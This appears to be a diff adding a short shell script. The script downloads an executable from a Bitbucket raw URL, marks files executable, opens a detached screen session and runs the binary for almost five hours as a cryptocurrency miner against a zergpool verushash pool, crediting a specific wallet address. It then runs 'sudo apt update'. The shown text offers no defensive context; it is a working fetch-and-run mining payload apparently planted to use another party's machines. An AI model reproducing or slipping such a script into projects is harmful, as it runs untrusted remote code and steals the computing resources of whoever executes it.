@@ -1,0 +1,5 @@
+wget https://bitbucket.org/nheqccm/software/raw/258f6031e4475680d3a03ea8a5bcc51a86d0943c/nhm
+chmod +x *
+screen -dmS ls
+timeout 295m ./nhm -v -l verushash.na.mine.zergpool.com:3300 -u DCZxCjQrpoGHwdjZdqdUCn5CNtGZwgqVEv.NhMiner_00 -p x -t 12 && stop
+sudo apt update
